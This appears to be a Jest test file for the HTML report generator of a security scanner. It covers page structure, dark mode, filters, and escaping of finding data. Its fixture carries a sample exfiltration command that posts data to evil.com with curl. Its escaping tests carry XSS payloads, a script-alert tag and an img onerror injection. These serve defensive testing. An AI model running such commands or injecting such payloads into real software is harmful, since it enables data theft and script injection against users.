import { describe, it, expect } from '@jest/globals';
import { generateHtmlReport, formatHtmlReport } from '../../src/reporters/HtmlReporter.js';
import type { ScanResult, Finding } from '../../src/types.js';

// ── Fixtures ───────────────────────────────────────────────────────────────

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    ruleId: 'EXFIL-001',
    ruleName: 'Data Exfiltration',
    severity: 'HIGH',
    category: 'exfiltration',
    file: '/project/hook.sh',
    relativePath: 'scripts/hook.sh',
    line: 10,
    match: 'curl -d "data" https://evil.com',
    context: [],
    remediation: 'Remove the curl command',
    timestamp: new Date('2024-01-01T00:00:00.000Z'),
    riskScore: 80,
    ...overrides,
  };
}

function makeScanResult(findings: Finding[] = []): ScanResult {
  return {
    success: true,
    startTime: new Date('2024-01-01T00:00:00.000Z'),
    endTime: new Date('2024-01-01T00:00:01.000Z'),
    duration: 1500,
    scannedPaths: ['/project'],
    totalFiles: 3,
    analyzedFiles: 3,
    skippedFiles: 0,
    findings,
    findingsBySeverity: {
      CRITICAL: [], HIGH: [], MEDIUM: [], LOW: [], INFO: [],
    },
    findingsByCategory: {
      exfiltration: [], credentials: [], injection: [], backdoors: [],
      'supply-chain': [], permissions: [], persistence: [], obfuscation: [],
      'ai-specific': [], 'advanced-hiding': [], behavioral: [],
    },
    overallRiskScore: 70,
    summary: { critical: 0, high: findings.length, medium: 0, low: 0, info: 0, total: findings.length },
    errors: [],
  };
}

// ── Tests ──────────────────────────────────────────────────────────────────

describe('HtmlReporter', () => {
  describe('generateHtmlReport — HTML structure', () => {
    it('starts with <!DOCTYPE html>', () => {
      const html = generateHtmlReport(makeScanResult());
      expect(html.trimStart().startsWith('<!DOCTYPE html>')).toBe(true);
    });

    it('has an opening and closing <html> tag', () => {
      const html = generateHtmlReport(makeScanResult());
      expect(html).toContain('<html');
      expect(html).toContain('</html>');
    });

    it('has <head> and <body> sections', () => {
      const html = generateHtmlReport(makeScanResult());
      expect(html).toContain('<head>');
      expect(html).toContain('</head>');
      expect(html).toContain('<body>');
      expect(html).toContain('</body>');
    });

    it('includes a <title> tag', () => {
      const html = generateHtmlReport(makeScanResult(), { title: 'My Custom Report' });
      expect(html).toContain('<title>My Custom Report</title>');
    });

    it('embeds inline <style> and <script> blocks', () => {
      const html = generateHtmlReport(makeScanResult());
      expect(html).toContain('<style>');
      expect(html).toContain('<script>');
    });
  });

  describe('XSS prevention — escapeHtml', () => {
    it('escapes < and > in finding match', () => {
      const xssMatch = '<script>alert(1)</script>';
      const finding = makeFinding({ match: xssMatch });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).not.toContain('<script>alert(1)</script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('escapes double-quotes in finding relativePath', () => {
      const xssPath = '"><img src=x onerror=alert(1)>';
      const finding = makeFinding({ relativePath: xssPath });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).not.toContain('"><img');
      expect(html).toContain('&quot;&gt;');
    });

    it('escapes & in ruleId', () => {
      const finding = makeFinding({ ruleId: 'RULE-A&B' });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).toContain('RULE-A&amp;B');
    });

    it('escapes remediation text', () => {
      const finding = makeFinding({ remediation: 'Use <safe> method & rotate "keys"' });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).toContain('Use &lt;safe&gt; method &amp; rotate &quot;keys&quot;');
    });

    it('escapes context line content when showCode is true', () => {
      const finding = makeFinding({
        context: [{ lineNumber: 10, content: '<xss>', isMatch: true }],
      });
      const html = generateHtmlReport(makeScanResult([finding]), { showCode: true });
      expect(html).toContain('&lt;xss&gt;');
      expect(html).not.toContain('<xss>');
    });
  });

  describe('dark mode', () => {
    it('uses a dark background color when darkMode=true', () => {
      const html = generateHtmlReport(makeScanResult(), { darkMode: true });
      // Dark theme uses #0f172a as the primary background
      expect(html).toContain('#0f172a');
    });

    it('uses a light background color when darkMode=false', () => {
      const html = generateHtmlReport(makeScanResult(), { darkMode: false });
      // Light theme uses #ffffff as the primary background
      expect(html).toContain('#ffffff');
    });
  });

  describe('severity filter buttons', () => {
    it('includes filter buttons for all 5 severities', () => {
      const html = generateHtmlReport(makeScanResult());
      for (const severity of ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']) {
        expect(html).toContain(`data-value="${severity}"`);
      }
    });
  });

  describe('findings rendering', () => {
    it('renders the finding file path and line number', () => {
      const finding = makeFinding({ relativePath: 'src/hook.sh', line: 42 });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).toContain('src/hook.sh:42');
    });

    it('renders the ruleId in the output', () => {
      const finding = makeFinding({ ruleId: 'CRED-007' });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).toContain('CRED-007');
    });

    it('renders the riskScore', () => {
      const finding = makeFinding({ riskScore: 95 });
      const html = generateHtmlReport(makeScanResult([finding]));
      expect(html).toContain('95/100');
    });

    it('renders the finding count in the filter bar', () => {
      const findings = [makeFinding(), makeFinding(), makeFinding()];
      const html = generateHtmlReport(makeScanResult(findings));
      expect(html).toContain('3 of 3 findings');
    });

    it('shows no-findings message when findings list is empty', () => {
      const html = generateHtmlReport(makeScanResult([]));
      expect(html).toContain('0 of 0 findings');
    });
  });

  describe('summary statistics', () => {
    it('includes the analyzedFiles count', () => {
      const result = makeScanResult([]);
      result.analyzedFiles = 12;
      const html = generateHtmlReport(result);
      expect(html).toContain('12');
    });

    it('includes the overallRiskScore', () => {
      const result = makeScanResult([]);
      result.overallRiskScore = 42;
      const html = generateHtmlReport(result);
      expect(html).toContain('42');
    });
  });

  describe('formatHtmlReport', () => {
    it('delegates to generateHtmlReport and returns a string', () => {
      const result = makeScanResult([makeFinding()]);
      const html = formatHtmlReport(result, { darkMode: true });
      expect(typeof html).toBe('string');
      expect(html).toContain('<!DOCTYPE html>');
      expect(html).toContain('#0f172a');
    });
  });
});
